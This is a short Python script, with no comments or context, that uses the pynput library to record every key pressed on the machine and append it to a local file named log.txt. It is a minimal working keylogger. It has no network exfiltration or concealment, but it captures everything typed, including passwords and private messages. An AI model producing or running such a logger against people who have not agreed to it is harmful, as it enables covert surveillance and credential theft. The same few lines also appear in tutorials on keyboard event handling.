from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as log_file:
        log_file.write(f"{key}\n")

with Listener(on_press=on_press) as listener:
    listener.join()
